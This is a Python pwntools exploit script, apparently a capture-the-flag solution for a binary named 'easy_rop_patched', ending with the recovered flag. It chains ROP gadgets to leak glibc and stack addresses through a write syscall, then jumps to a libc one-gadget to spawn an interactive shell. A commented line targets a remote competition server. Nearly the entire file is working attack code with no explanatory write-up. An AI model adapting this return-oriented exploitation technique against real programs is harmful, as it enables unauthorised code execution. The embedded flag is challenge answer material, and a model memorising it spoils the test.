from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./easy_rop_patched', '''
    b *(main+32)
    continue
''')

# p = remote('74.207.229.59', 20222)

# Move forward $rsp to prepare for the leak
chain1 = [
    0x40113c,   # add rsp, 0x8; ret
    0x40113c,   # add rsp, 0x8; ret
    0x40113c,   # add rsp, 0x8; ret
    0x40113c,   # add rsp, 0x8; ret
    0x40113c,   # add rsp, 0x8; ret
    0x40113c,   # add rsp, 0x8; ret
    0x40113c,   # add rsp, 0x8; ret
    0x40113c,   # add rsp, 0x8; ret
    0x401106    # main function to read another ROP chain
]
p.send(b'A'*0x28+b''.join([p64(c1) for c1 in chain1]))
pause()

# Leak glibc base address and current $rsp value
chain2 = [
    0x401106,               # main function to make $rax = 1 (write syscall later)
    0x40112e, 1, 0x404200,  # pop rdi; pop rbp; ret
    0x401126, 0x404200,     # syscall; pop rbp; ret (write syscall)
    0x401106                # main function to read another ROP chain
]
p.send(b'A'*0x28+b''.join([p64(c2) for c2 in chain2]))
pause()
p.send(b'A')
leaks = p.recv(0x80)
glibc_base_addr = u64(leaks[-8:].ljust(8, b'\x00')) - 0x2a47b
log.info(f'glibc base address: {hex(glibc_base_addr)}')
current_rsp_value = u64(leaks[-16:-8].ljust(8, b'\x00')) - 0x88
log.info(f'current rsp value: {hex(current_rsp_value)}')

# Pop a shell
glibc_e = ELF('./libc.so.6')
glibc_r = ROP('./libc.so.6')
chain3 = [
    glibc_r.r12.address + glibc_base_addr, 0,   # pop r12; ret
    glibc_r.r13.address + glibc_base_addr, 0,   # pop r13; ret
    0x40112f, current_rsp_value + 0x8,          # pop rbp; ret
    0xf6237 + glibc_base_addr                   # one gadget
]
p.send(b'A'*0x28+b''.join([p64(c3) for c3 in chain3]))

p.interactive()

# texsaw{4sM_5t1lL_h45_l1bC_wh4t????}